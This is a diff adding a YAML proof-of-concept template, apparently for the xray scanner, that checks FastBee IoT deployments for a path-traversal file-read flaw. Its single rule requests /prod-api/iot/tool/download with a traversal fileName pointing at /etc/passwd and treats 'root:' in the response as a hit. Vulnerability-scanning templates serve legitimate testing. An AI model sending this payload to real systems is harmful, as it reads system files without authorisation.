@@ -1,0 +1,20 @@
+name: poc-yaml-fengxinwulian-FastBee-download-File-reading
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    expression: response.status == 200 && response.body.bcontains(b'root:')
+
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487196&idx=1&sn=50ebf829675b788635054e5f78fc3104&chksm=c267bbeff51032f9a0546b6433687373c03b6ac0a5fa1c49129306a5c2c1dd3c050722c240b8&token=101124693&lang=zh_CN#rd
+
